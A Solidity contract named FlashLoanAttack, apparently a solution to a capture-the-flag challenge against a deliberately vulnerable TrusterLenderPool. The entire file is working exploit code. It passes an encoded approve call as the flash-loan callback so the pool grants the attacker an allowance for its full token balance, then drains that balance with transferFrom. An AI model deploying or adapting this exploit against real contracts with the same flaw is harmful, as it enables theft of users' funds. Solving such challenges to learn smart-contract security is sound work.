// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract FlashLoanAttack {
    function attack(address _pool, address _token) public {
        TrusterLenderPool trusterLenderPool = TrusterLenderPool(_pool);

        bytes memory data =
            abi.encodeWithSignature("approve(address,uint256)", address(this), IERC20(_token).balanceOf(_pool));
        trusterLenderPool.flashLoan(0, msg.sender, address(_token), data);
        IERC20(_token).transferFrom(address(_pool), msg.sender, IERC20(_token).balanceOf(_pool));
    }
}
